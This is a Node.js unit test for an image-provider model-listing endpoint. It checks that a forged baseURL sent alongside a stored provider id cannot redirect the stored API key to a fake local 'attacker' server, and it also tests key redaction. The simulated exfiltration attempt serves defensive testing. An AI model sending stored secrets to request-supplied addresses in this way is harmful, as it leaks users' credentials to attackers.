#!/usr/bin/env node
// 单测:r50 生图 provider 的模型列表自动拉取(POST /api/image-providers/fetch-models)
// + 尺寸候选选项化。核心牙是【防密钥外传】:id 态下 baseURL 必须强制取存储值,
// 否则 {id, baseURL:攻击者地址} 会让服务端把该 provider 的真实密钥发去攻击者端点。
// Run: node tests/unit/check-r50-image-fetch-models.mjs
//
// 隔离:HOME/USERPROFILE 指向 mktemp 目录(真实 ~/.claude-gui 一个字节不碰);
// 上游全是本机假服务(6703 假上游 / 6704 假攻击者),绝不打真实网络。
import assert from 'node:assert/strict';
import { mkdtempSync, rmSync, readFileSync } from 'node:fs';
import { createServer } from 'node:http';
import { createHash } from 'node:crypto';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

// 必须在 import 路由前改 HOME:真实 HOME 下的用户数据只读不写(红线)。
const TMP_HOME = mkdtempSync(join(tmpdir(), 'cgui-r50-home-'));
const SAVE_DIR = mkdtempSync(join(tmpdir(), 'cgui-r50-save-'));
process.env.HOME = TMP_HOME;
process.env.USERPROFILE = TMP_HOME;

const REPO = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const KEY = 'sk-r50-stored-secret-abcdef123456';
const FORM_KEY = 'sk-r50-form-key-998877665544';

// ─────────────────── 1. gemini 模型列表请求(纯函数,不打网络) ───────────────────
{
  const { geminiModelsRequest } = await import('../../server/utils/image-protocols.js');
  const official = geminiModelsRequest('https://generativelanguage.googleapis.com/v1beta/', KEY);
  assert.equal(official.url, 'https://generativelanguage.googleapis.com/v1beta/models', 't1: 官方端点 GET {base}/models(尾斜杠归一)');
  assert.equal(official.headers['x-goog-api-key'], KEY, 't1: 官方域走 x-goog-api-key');
  assert.ok(!official.headers.Authorization, 't1: 官方域不同时押 Bearer');
  assert.equal(official.altHeaders.Authorization, `Bearer ${KEY}`, 't1: 官方域回落 Bearer');

  const relay = geminiModelsRequest('https://relay.example.com/v1beta', KEY);
  assert.equal(relay.headers.Authorization, `Bearer ${KEY}`, 't1: 中转站端点优先 Bearer');
  assert.equal(relay.altHeaders['x-goog-api-key'], KEY, 't1: 中转站端点回落 x-goog-api-key');
}

// ─────────────────── 2. 生成链路一字不动(buildImageRequest 源码钉死) ───────────────────
// r50 只加"拉模型"这条读路径,出图的请求组装不许被顺手改。基线哈希写死在测试里 ——
// 用 git diff 对比在 commit 之后会恒真,写死才是真牙。
{
  const src = readFileSync(join(REPO, 'server/utils/image-protocols.js'), 'utf8');
  const m = src.match(/export function buildImageRequest[\s\S]*?\n\}\n/);
  assert.ok(m, 't2: 能定位 buildImageRequest 源码块');
  assert.equal(
    createHash('sha256').update(m[0]).digest('hex'),
    '2461686b0a8404076e185e1155c3f217b5aa6fc791abd70ec19954f499f7b415',
    't2: buildImageRequest 一字未改(生成链路红线);若确需改动,连同 check-image-gen 的断言一起复核后再更新此基线',
  );
}

// ─────────────────── 3. 端到端:本地假上游(6703)+ 假攻击者(6704) ───────────────────
const express = (await import('express')).default;
const imageRouter = (await import('../../server/routes/image.js')).default;

const app = express();
app.use(express.json({ limit: '2mb' }));

// 假上游:openai 形态的 /v1/models(记录收到的鉴权头)
const openaiHits = [];
app.get('/fake/v1/models', (req, res) => {
  openaiHits.push({ auth: req.headers.authorization || '', xkey: req.headers['x-api-key'] || '' });
  res.json({ data: [{ id: 'gpt-image-2' }, { id: 'dall-e-3' }] });
});
// 存储态 provider 用的上游(与上面分开,便于断言"打的是存储 baseURL")
const storedHits = [];
app.get('/stored/v1/models', (req, res) => {
  storedHits.push({ auth: req.headers.authorization || '', xkey: req.headers['x-api-key'] || '' });
  res.json({ data: [{ id: 'stored-model-a' }] });
});
// 假 gemini 中转站:端点形态是中转(127.0.0.1)→ 主用 Bearer,必须 401 后换
// x-goog-api-key 重试才拿得到列表。geminiAttempts 记录尝试顺序。
const geminiAttempts = [];
app.get('/gem/v1beta/models', (req, res) => {
  geminiAttempts.push(req.headers['x-goog-api-key'] ? 'goog' : (req.headers.authorization ? 'bearer' : 'none'));
  if (!req.headers['x-goog-api-key']) return res.status(401).json({ error: 'API key required' });
  res.json({ models: [{ name: 'models/gemini-3-pro-image' }, { name: 'models/imagen-4' }] });
});
// 把密钥回显进错误正文的上游(透传前必须被 redact)
app.get('/leak/v1/models', (req, res) => res.status(401)
  .json({ error: { message: `invalid key ${req.headers.authorization}` } }));
// 没有模型列表接口的上游(anthropic 中转常见)
app.get('/nolist/v1/models', (_req, res) => res.status(404).json({ error: 'not found' }));

app.use('/api', imageRouter);

// 假攻击者(6704):任何一次请求都算失守 —— 存储 key 绝不许发到请求体指定的地址。
let evilHits = 0;
let evilSawKey = false;
const evilServer = createServer((req, res) => {
  evilHits += 1;
  const seen = `${req.headers.authorization || ''}${req.headers['x-api-key'] || ''}`;
  if (seen.includes(KEY)) evilSawKey = true;
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ data: [{ id: 'attacker-model' }] }));
});

// 端口只许 6703/6704,但隔壁分支的 E2E 也在用 → EADDRINUSE 退让重试,不当假失败。
async function listenWithRetry(port, tries = 40, make = (p) => app.listen(p, '127.0.0.1')) {
  for (let i = 0; i < tries; i++) {
    const s = make(port);
    const r = await new Promise((resolve) => {
      s.once('listening', () => resolve({ ok: true }));
      s.once('error', (e) => resolve({ ok: false, err: e }));
    });
    if (r.ok) return s;
    if (r.err?.code !== 'EADDRINUSE') throw r.err;
    await new Promise((done) => setTimeout(done, 500));
  }
  throw new Error(`端口 ${port} 持续被占用(隔壁 worktree 的 E2E?),重试 ${tries} 次后放弃`);
}
const server = await listenWithRetry(6703);
await listenWithRetry(6704, 40, (p) => evilServer.listen(p, '127.0.0.1'));
const BASE = 'http://127.0.0.1:6703';
const EVIL = 'http://127.0.0.1:6704';
const api = async (method, path, body) => {
  const r = await fetch(`${BASE}${path}`, {
    method,
    headers: body ? { 'Content-Type': 'application/json' } : undefined,
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await r.text();
  let json = null; try { json = JSON.parse(text); } catch {}
  return { status: r.status, text, json };
};
const fetchModels = (body) => api('POST', '/api/image-providers/fetch-models', body);

let failure = null;
try {
  // 3.1 表单态(尚无 id):用表单里的 baseURL + key 拉
  {
    const r = await fetchModels({ baseURL: `${BASE}/fake/v1`, apiKey: FORM_KEY, protocol: 'openai' });
    assert.equal(r.status, 200, `t3.1: 表单态拉取成功(${r.text})`);
    assert.equal(r.json.ok, true, 't3.1: ok:true');
    assert.deepEqual(r.json.models, ['gpt-image-2', 'dall-e-3'], 't3.1: data[].id 解析正确');
    assert.ok(openaiHits.length >= 1, 't3.1: 真的打到了表单里填的上游');
    assert.ok(
      openaiHits.some((h) => h.auth.includes(FORM_KEY) || h.xkey.includes(FORM_KEY)),
      't3.1: 带的是表单里填的 key',
    );
    assert.ok(!r.text.includes(FORM_KEY), 't3.1: 响应体不回显 key');
  }

  // 3.2【核心牙】id 态 + 请求体伪造 baseURL → 必须打存储的 baseURL,存储 key 绝不外发
  {
    const mk = await api('POST', '/api/image-providers', {
      name: '存储态', protocol: 'openai', baseURL: `${BASE}/stored/v1`,
      apiKey: KEY, model: 'm', savePath: SAVE_DIR,
    });
    assert.equal(mk.status, 200, `t3.2: 建 provider(${mk.text})`);
    const before = storedHits.length;
    const r = await fetchModels({ id: mk.json.id, baseURL: `${EVIL}/evil/v1`, protocol: 'openai' });
    assert.equal(r.status, 200, `t3.2: 拉取应走存储 baseURL 并成功(${r.text})`);
    assert.deepEqual(r.json.models, ['stored-model-a'], 't3.2: 拿到的是【存储 baseURL】那台的模型,不是攻击者的');
    assert.equal(storedHits.length, before + 1, 't3.2: 请求打到存储 baseURL');
    assert.ok(
      storedHits.at(-1).auth.includes(KEY) || storedHits.at(-1).xkey.includes(KEY),
      't3.2: 存储 key 发给存储 baseURL(编辑态留空 key = 用存储 key)',
    );
    assert.equal(evilHits, 0, 't3.2【防外传】:请求体里的 baseURL 一律忽略,攻击者端点一次都不许被打到');
    assert.equal(evilSawKey, false, 't3.2【防外传】:存储 key 绝不发往请求体指定的地址');

    // 反向钉死:攻击者地址本身是可达的(回环放行)—— 上面 0 次不是被 SSRF 守卫顺手挡掉的
    const reach = await fetchModels({ baseURL: `${EVIL}/evil/v1`, apiKey: 'sk-form-typed-by-user', protocol: 'openai' });
    assert.equal(reach.json?.ok, true, `t3.2: 该地址在表单态可达(证明 0 次是"强制存储 baseURL"挡的)(${reach.text})`);
    assert.equal(evilHits, 1, 't3.2: 只有用户自己在表单里填时才打过去');
    assert.equal(evilSawKey, false, 't3.2: 打过去带的是用户现填的 key,不是存储 key');
    await api('DELETE', `/api/image-providers/${mk.json.id}`);
  }

  // 3.3 gemini 态:GET {base}/models,models[].name 剥 models/ 前缀;401 换认证头重试
  {
    const r = await fetchModels({ baseURL: `${BASE}/gem/v1beta`, apiKey: FORM_KEY, protocol: 'gemini' });
    assert.equal(r.status, 200, `t3.3: gemini 拉取成功(${r.text})`);
    assert.deepEqual(r.json.models, ['gemini-3-pro-image', 'imagen-4'], 't3.3: models[].name 剥掉 models/ 前缀');
    assert.deepEqual(geminiAttempts, ['bearer', 'goog'], 't3.3: 先按端点形态用 Bearer,401 后回落 x-goog-api-key');
  }

  // 3.4 错误分类 + 密钥不进响应
  {
    const leak = await fetchModels({ baseURL: `${BASE}/leak/v1`, apiKey: FORM_KEY, protocol: 'openai' });
    assert.equal(leak.json.ok, false, 't3.4: 鉴权失败 → ok:false');
    assert.equal(leak.json.type, 'auth', 't3.4: 401 归类为 auth');
    assert.ok(!leak.text.includes(FORM_KEY), `t3.4: 上游回显的 key 被 redact(实际:${leak.text})`);
    assert.ok(leak.text.includes('***'), 't3.4: 剥掉后留掩码(证明确实经过 redactKey)');

    const nolist = await fetchModels({ baseURL: `${BASE}/nolist/v1`, apiKey: FORM_KEY, protocol: 'openai' });
    assert.equal(nolist.json.ok, false, 't3.4: 没有列表接口 → ok:false');
    assert.equal(nolist.json.type, 'unsupported', 't3.4: 非 401/403 的失败归类为 unsupported(引导手填)');

    const dead = await fetchModels({ baseURL: 'http://127.0.0.1:6799/v1', apiKey: '', protocol: 'openai' });
    assert.equal(dead.json.ok, false, 't3.4: 连不上 → ok:false');
    assert.equal(dead.json.type, 'network', 't3.4: 网络层失败归类为 network(别说成"没有该接口")');

    const bad = await fetchModels({ baseURL: 'not-a-url', protocol: 'openai' });
    assert.equal(bad.status, 400, 't3.4: baseURL 非法 → 400');
    assert.equal(bad.json.ok, false, 't3.4: 非法入参同样是 ok:false 形态');

    const ghost = await fetchModels({ id: 'no-such-provider', protocol: 'openai' });
    assert.equal(ghost.status, 404, 't3.4: id 指向不存在的 provider → 404');
  }

  // 3.5 publicView 白名单不动:拉模型不得把 key 带进任何列表响应
  {
    const list = await api('GET', '/api/image-providers');
    assert.ok(!list.text.includes(KEY) && !list.text.includes(FORM_KEY), 't3.5: 列表响应仍不含任何 apiKey');
  }
} catch (e) {
  failure = e;
} finally {
  server.closeAllConnections?.();
  server.close();
  await new Promise((r) => server.once('close', r));
  evilServer.closeAllConnections?.();
  evilServer.close();
  await new Promise((r) => evilServer.once('close', r));
  for (const d of [TMP_HOME, SAVE_DIR]) rmSync(d, { recursive: true, force: true });
}
if (failure) throw failure;

// ─────────────────── 4. 前端源码断言:按钮 / datalist / busy / 尺寸候选 / 小字 ───────────────────
{
  const src = readFileSync(join(REPO, 'client/src/components/ImagePanel.jsx'), 'utf8');
  assert.ok(src.includes('/api/image-providers/fetch-models'), 't4: 按钮调用新端点');
  assert.match(src, /<datalist/, 't4: 用 datalist(保留手输,不改成 select)');
  assert.match(src, /list=/, 't4: 输入框挂上 datalist');
  assert.match(src, /拉取模型/, 't4: 有「拉取模型」按钮');
  assert.match(src, /fetchingModels|setFetchingModels/, 't4: 拉取有 busy 态');
  assert.match(src, /拉到 \$\{|拉到/, 't4: 成功后提示拉到多少个模型');
  // 三类失败都要有可行动文案,不许吞错
  assert.match(src, /鉴权失败/, 't4: auth 文案');
  assert.match(src, /手动填写模型名|手填/, 't4: unsupported 引导手填');
  // ④ 尺寸候选(三类形态并存)+ per-protocol 小字
  for (const v of ['auto', '1024x1024', '1920x1080', '2048x2048', '3840x2160', '4096x4096', '1K', '2K', '4K', '1:1', '16:9', '9:16', '4:3', '3:4', '21:9']) {
    assert.ok(src.includes(`'${v}'`), `t4: 尺寸候选含 ${v}`);
  }
  assert.ok(src.includes('随请求发送'), 't4: openai 协议的尺寸小字在位');
  assert.ok(src.includes('该协议无原生尺寸字段'), 't4: gemini/chat 协议的尺寸小字在位');
  assert.ok(src.includes('附加参数（extra）') || src.includes('附加参数(extra)'), 't4: 小字指向附加参数');
}

console.log('✓ check-r50-image-fetch-models: 拉模型端点(防外传/三协议/错误分类/密钥不外泄)+ 尺寸候选 全部通过');
